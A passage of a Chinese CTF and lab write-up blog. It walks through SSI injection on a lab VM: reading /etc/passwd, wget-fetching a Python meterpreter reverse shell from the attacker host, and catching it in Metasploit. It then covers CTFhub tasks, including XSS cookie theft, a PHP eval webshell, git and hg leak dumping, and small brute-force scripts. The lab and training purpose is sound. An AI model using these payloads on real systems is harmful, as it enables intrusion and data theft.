loading="lazy"></p><p>其他的暂时没有，继续探测，因为是http服务，所以可以使用nikto或者dirb进行敏感目录扫描</p><h2 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h2><p>分析nmap、nikto扫描结果，并对结果进行分析，挖掘可利用的信息；<br><img src="https://img-blog.csdnimg.cn/20200801174758402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>都进行浏览查看敏感信息，寻找可利用的位置；</p><p>挨个访问查看信息，<code>http://10.0.2.15/index</code><br><img src="https://img-blog.csdnimg.cn/20200801175131376.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>上面扫描中有个SSI<br><img src="https://img-blog.csdnimg.cn/20200801174817312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>还有这里，发现<code>.shtml</code>文件<br><img src="https://img-blog.csdnimg.cn/20200801174906852.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>猜想可能存在SSI注入，其实找了很多信息，就是为了找到这个能证明有SSI存在的标志。</p><p>继续找可以利用的信息，发现<code>http://10.0.2.15/index.php</code><br><img src="https://img-blog.csdnimg.cn/20200801175109305.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以在这个表单提交处，这里执行SSI的命令</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据提示来利用对应的SSI注入</p><p>将上面index页面中的payload复制一下，粘贴到表单中进行提交</p><p>像这样<br><img src="https://img-blog.csdnimg.cn/20200801175317199.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>提交后发现第一行过滤了尖括号，第二行的exec被过滤了。而且payload也不是完整的。<br><img src="https://img-blog.csdnimg.cn/20200801175328391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>绕过这个exec的过滤条件，因为是linux系统，所以首先想到的应该是大小写。而且完整的payload应当在前面有<code>!</code><br>像这样</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="cat /etc/passwd" --></span> </code></pre><p><img src="https://img-blog.csdnimg.cn/20200801175408808.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>比如：</p><p>列举当前目录中的文件和目录</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="ls"--></span></code></pre><p>就是可以执行一些终端命令</p><p>进一步利用，下载一个shell脚本并重命名为shell.php</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="wget http://ip/shell.txt | rename shell.txt shell.php"--></span></code></pre><h2 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h2><p>之前使用的php制作的webshell，这次使用python</p><pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p python/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">10.0</span>.2.4 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> -f raw <span class="token operator">></span> /root/Desktop/shell.py</code></pre><p><img src="https://img-blog.csdnimg.cn/2020080117543731.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>启动监听，使用metasploit对4444端口进行监听</p><pre class="language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handler <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload python/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> python/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">10.0</span>.2.4lhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.0</span>.2.4msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.0</span>.2.4:4444 </code></pre><p>设置好后开始侦听4444端口<br><img src="https://img-blog.csdnimg.cn/20200801175504902.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>将shell.py移动到apache目录下，才可以使用IP地址的链接下载<br><img src="https://img-blog.csdnimg.cn/20200801175517993.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>然后需要开启apache服务<code>service apache2 start</code><br><img src="https://img-blog.csdnimg.cn/2020080117553599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>然后执行下载命令将shell下载到靶机的站点目录当中，</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="wget http://10.0.2.4/shell.py"--></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200801175551640.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>然后执行语句赋予shell执行权限再进行执行</p><pre class="language-html" data-language="html"><code class="language-html">#加权限<span class="token comment">&lt;!--#exec cmd="chmod 777 shell.py"--></span>#执行<span class="token comment">&lt;!--#exec cmd="python shell.py"--></span></code></pre><p>然后看到浏览器在不断发送请求，到终端查看监听状况，发现返回了<code>meterpreter</code><br><img src="https://img-blog.csdnimg.cn/20200801175815913.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>输入<code>?</code>可以查看当前可执行的命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">Core Commands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    Command                   Description    -------                   -----------    ?                         Help menu    background                Backgrounds the current session    <span class="token function">bg</span>                        Alias <span class="token keyword">for</span> background    bgkill                    Kills a background meterpreter script    bglist                    Lists running background scripts    bgrun                     Executes a meterpreter script as a background thread    channel                   Displays information or control active channels    close                     Closes a channel    disable_unicode_encoding  Disables encoding of unicode strings    enable_unicode_encoding   Enables encoding of unicode strings    <span class="token builtin class-name">exit</span>                      Terminate the meterpreter session    get_timeouts              Get the current session <span class="token function">timeout</span> values    guid                      Get the session GUID    <span class="token builtin class-name">help</span>                      Help menu    info                      Displays information about a Post module    irb                       Open an interactive Ruby shell on the current session    load                      Load one or <span class="token function">more</span> meterpreter extensions    machine_id                Get the MSF ID of the machine attached to the session    migrate                   Migrate the server to another process    pry                       Open the Pry debugger on the current session    quit                      Terminate the meterpreter session    <span class="token builtin class-name">read</span>                      Reads data from a channel    resource                  Run the commands stored <span class="token keyword">in</span> a <span class="token function">file</span>    run                       Executes a meterpreter script or Post module    secure                    <span class="token punctuation">(</span>Re<span class="token punctuation">)</span>Negotiate TLV packet encryption on the session    sessions                  Quickly switch to another session    set_timeouts              Set the current session <span class="token function">timeout</span> values    <span class="token function">sleep</span>                     Force Meterpreter to go quiet, <span class="token keyword">then</span> re-establish session.    transport                 Change the current transport mechanism    use                       Deprecated <span class="token builtin class-name">alias</span> <span class="token keyword">for</span> <span class="token string">"load"</span>    uuid                      Get the UUID <span class="token keyword">for</span> the current session    <span class="token function">write</span>                     Writes data to a channelStdapi: File system Commands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>    Command       Description    -------       -----------    <span class="token function">cat</span>           Read the contents of a <span class="token function">file</span> to the <span class="token function">screen</span>    <span class="token builtin class-name">cd</span>            Change directory    checksum      Retrieve the checksum of a <span class="token function">file</span>    <span class="token function">chmod</span>         Change the permissions of a <span class="token function">file</span>    <span class="token function">cp</span>            Copy <span class="token builtin class-name">source</span> to destination    <span class="token function">dir</span>           List files <span class="token punctuation">(</span>alias <span class="token keyword">for</span> <span class="token function">ls</span><span class="token punctuation">)</span>    download      Download a <span class="token function">file</span> or directory    edit          Edit a <span class="token function">file</span>    getlwd        Print <span class="token builtin class-name">local</span> working directory    getwd         Print working directory    lcd           Change <span class="token builtin class-name">local</span> working directory    lls           List <span class="token builtin class-name">local</span> files    lpwd          Print <span class="token builtin class-name">local</span> working directory    <span class="token function">ls</span>            List files    <span class="token function">mkdir</span>         Make directory    <span class="token function">mv</span>            Move <span class="token builtin class-name">source</span> to destination    <span class="token builtin class-name">pwd</span>           Print working directory    <span class="token function">rm</span>            Delete the specified <span class="token function">file</span>    <span class="token function">rmdir</span>         Remove directory    search        Search <span class="token keyword">for</span> files    upload        Upload a <span class="token function">file</span> or directoryStdapi: Networking Commands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    Command       Description    -------       -----------    <span class="token function">ifconfig</span>      Display interfaces    ipconfig      Display interfaces    portfwd       Forward a <span class="token builtin class-name">local</span> port to a remote <span class="token function">service</span>    resolve       Resolve a <span class="token builtin class-name">set</span> of <span class="token function">host</span> names on the targetStdapi: System Commands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    Command       Description    -------       -----------    execute       Execute a <span class="token builtin class-name">command</span>    getenv        Get one or <span class="token function">more</span> environment variable values    getpid        Get the current process identifier    getuid        Get the user that the server is running as    <span class="token function">kill</span>          Terminate a process    localtime     Displays the target system's <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span>    pgrep         Filter processes by name    <span class="token function">pkill</span>         Terminate processes by name    <span class="token function">ps</span>            List running processes    shell         Drop into a system <span class="token builtin class-name">command</span> shell    sysinfo       Gets information about the remote system, such as OSStdapi: Audio Output Commands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    Command       Description    -------       -----------    play          play a waveform audio <span class="token function">file</span> <span class="token punctuation">(</span>.wav<span class="token punctuation">)</span> on the target system</code></pre><p>输入shell进行利用，再查看id，发现当前登录的只是一个普通用户，而不是root用户<br><img src="https://img-blog.csdnimg.cn/20200801175832732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>终端可以选择进行优化一下，就是让其显示用户名和主机名，和kali的终端形式那样。</p><p>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p><p>然后就是提权，靶场没有设置flag值，目的是为了学习SSI注入，所以就不再继续进行下去了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于SSI漏洞服务器有很多过滤机制，需要进行绕过，比如大小写。</p><p>防御措施：</p><p>一、进行过滤，过滤这些语法中的特殊字符</p><p>二、关闭服务器SSI相关功能</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFhub技能树web &amp; BUU杂项</title>
      <link href="/posts/c853520d/"/>
      <url>/posts/c853520d/</url>
      
        <content type="html"><![CDATA[<h2 id="xss反射型"><a href="#xss反射型" class="headerlink" title="xss反射型"></a>xss反射型</h2><p>xss先查看源码。找一下插入点<br><img src="https://img-blog.csdnimg.cn/20200803164210765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>那随便插一个xss，其实没有过滤，直接弹窗了。<br><img src="https://img-blog.csdnimg.cn/20200803164948840.jpg" alt="m0re" loading="lazy"><br>但是没有得到flag，然后看了大佬wp，才知道是要打出来cookie，注册一个xss平台，创建一个项目<br><img src="https://img-blog.csdnimg.cn/20200803173003609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后复制一下环境的URL，在name后面加上payload<br><img src="https://img-blog.csdnimg.cn/20200803173458584.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后send，返回结果成功，回到xss平台查看项目<br><img src="https://img-blog.csdnimg.cn/20200803173622599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://img-blog.csdnimg.cn/20200803200133551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>shell.txt里面是</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ctfhub'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>request默认包含get和post方式，原本不知道，看了大佬的wp才学习到一个新姿势<br>使用file包含shell.txt然后结合利用命令执行<br><img src="https://img-blog.csdnimg.cn/20200803200421834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后查看根目录<br><img src="https://img-blog.csdnimg.cn/20200803200557618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>发现flag然后就是查看flag，用cat就可以。</p><h2 id="git泄露——log"><a href="#git泄露——log" class="headerlink" title="git泄露——log"></a>git泄露——log</h2><p>需要用到工具Githack这个工具——🔑<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a><br>目前只支持python2，还有就是，使用这个工具需要安装git<br>先用工具处理一下</p><pre class="language-bash" data-language="bash"><code class="language-bash">python GitHack.py http://challenge-ade6802494a678e6.sandbox.ctfhub.com:10080//.git/</code></pre><p><img src="https://img-blog.csdnimg.cn/2020080500132969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后切换至dist中的目录，使用命令<code>git log</code>查看历史记录</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log</code></pre><p><img src="https://img-blog.csdnimg.cn/20200805001636818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后diff一下remove的时候的提交记录。<br><img src="https://img-blog.csdnimg.cn/2020080500172177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>第二种方法<br>使用命令<code>git reset </code>切换到add flag时的版本，就可以看到目录下生成了几个文件，点开txt文件就可以看到flag了。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset --hard 9606461bae67fe7941a3b4049d89be560a6e9386</code></pre><p><img src="https://img-blog.csdnimg.cn/20200805002022565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="git泄露——Stash"><a href="#git泄露——Stash" class="headerlink" title="git泄露——Stash"></a>git泄露——Stash</h2><p>仍然使用Githack进行处理<br>接下来使用<code>git stash list</code>查看<br><img src="https://img-blog.csdnimg.cn/20200805003531552.png" alt="m0re" loading="lazy"><br>再使用命令<code>git stash pop</code>从 git 栈中弹出来一个文件，文件内有flag<br><img src="https://img-blog.csdnimg.cn/20200805003646192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="git泄露——Index"><a href="#git泄露——Index" class="headerlink" title="git泄露——Index"></a>git泄露——Index</h2><p>步骤跟log一模一样就可以，详细的不写了，直接贴个图叭。<br><img src="https://img-blog.csdnimg.cn/2020080500431126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>使用工具——🔑<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>这个工具也可解决svn泄露的题，但是我没有找到flag，找了wp，复现没成功。然后就放弃了。不过hg泄露也是没成功。懒得总结了，就直接写新知识。<br>命令就这个，其他全靠找。</p><pre class="language-bash" data-language="bash"><code class="language-bash">./rip-hg.pl -v -u http://challenge-96fb44c6e263bd06.sandbox.ctfhub.com:10080/.hg/</code></pre><p><img src="https://img-blog.csdnimg.cn/20200805114627567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>情况呢，就是这么个情况，了解了这个知识就可以了，最起码操作是会了，找不到flag这个问题，不纠结了。<br><img src="https://img-blog.csdnimg.cn/20200805114702478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>都不用爆破的，都是admin</p><h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><p>用户名：<code>eyougw </code><br>密码：<code>admin@(eyou)</code><br>看大佬的wp是这样的。害，还是太年轻。</p><h2 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h2><p>这个题，试了几种常见的密码，没有效果啊。有点头大，莫得思路。找了wp看的。发现这个题是有个提示的，但是CTFhub里没写。<br>提示：<code>easy xor???</code><br>使用python2编写的脚本，这个是在网上找的。<br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/83041029">https://blog.csdn.net/xiangshangbashaonian/article/details/83041029</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> <span class="token operator">*</span> b<span class="token operator">=</span>b64decode<span class="token punctuation">(</span><span class="token string">"AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs="</span><span class="token punctuation">)</span> data<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token comment">#转成列表</span>  <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag<span class="token operator">=</span><span class="token string">""</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>k<span class="token punctuation">)</span>     <span class="token keyword">print</span> flag<span class="token operator">+</span><span class="token string">"\n"</span></code></pre><p>尝试编写python3的，但是失败了。在评论区看到一个大佬写的python3的，但是在这道题中用不了。我的是python3.7运行失败。<br>不过这个博主好像是我们学校的大佬。😁应该早就毕业了。不认识！</p><h2 id="还原大师"><a href="#还原大师" class="headerlink" title="还原大师"></a>还原大师</h2><p><img src="https://img-blog.csdnimg.cn/2020073013281657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>脚本如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#-*- coding: utf-8 -*-</span><span class="token comment">#!/usr/bin/env/python</span><span class="token keyword">import</span> hashlibm <span class="token operator">=</span> <span class="token string">'TASC?O3RJMV?WDJKX?ZM'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp1 <span class="token operator">=</span> m<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp2 <span class="token operator">=</span> temp1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp3 <span class="token operator">=</span> temp2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>            s <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>temp3<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'E903'</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>原字符串有三个位置是不知道的，所以需要三个循环语句对这三个位置进行暴力猜解，最后使用切片判断字符串的大写MD5前四位是不是匹配<code>E903</code>，如果匹配就是flag</p><h2 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h2><p>两个压缩包，一个虚假的压缩包，一个真实的压缩包。拖进010editor查看，虚假的压缩包是伪加密，破解得到一个文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">数学题n <span class="token operator">=</span> <span class="token number">33</span>e <span class="token operator">=</span> <span class="token number">3</span>解26-------------------------答案是</code></pre><p>一个简单的rsa，应该都用不到gmpy2这个模块</p><pre class="language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span><span class="token number">33</span>e<span class="token operator">=</span><span class="token number">3</span>m<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> m<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token punctuation">(</span>m<span class="token operator">**</span>e<span class="token punctuation">)</span><span class="token operator">%</span>n    <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token operator">==</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m="</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>    m<span class="token operator">+=</span><span class="token number">1</span></code></pre><p>简单的爆破，<br><img src="https://img-blog.csdnimg.cn/20200808144603165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>尝试密码，5是对的。所以真实的压缩包密码是<code>答案是5</code><br>得到一张图片和一个文件<br>查看图片，看到图片宽高不一致，于是就改的长一点<br><img src="https://img-blog.csdnimg.cn/20200808144938470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到了隐藏信息<br><img src="https://img-blog.csdnimg.cn/20200808145040296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>^5</code>异或5，呃呃呃，异或应该是脚本(默默去百度了大佬的wp)<br>python2的</p><pre class="language-python" data-language="python"><code class="language-python">f1 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./cxk'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>xor_data <span class="token operator">=</span> f1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>f1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>dec_data <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> xor_data<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span 